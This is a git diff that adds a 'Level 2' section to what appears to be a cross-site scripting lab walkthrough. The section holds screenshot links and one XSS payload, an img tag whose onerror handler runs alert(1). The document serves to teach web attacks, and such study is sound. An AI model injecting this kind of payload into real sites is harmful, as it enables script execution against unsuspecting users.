@@ -25,3 +25,14 @@ This attack is divided into three main categories as shown below:
 ```
 
 ![image](https://user-images.githubusercontent.com/60937657/209503133-c6fb5c5d-e0de-4d61-ad60-7cb183f42e69.png)
+
+### Level 2 
+
+![image](https://user-images.githubusercontent.com/60937657/209503755-05c0d614-3dda-4dc7-b855-a42d5b9f4cee.png)
+
+```
+<img src="http://inexist.ent"
+onerror="javascript:alert(1)"/>
+```
+
+![image](https://user-images.githubusercontent.com/60937657/209503869-0f536c23-f2a7-466c-bb0d-101e4a695477.png)
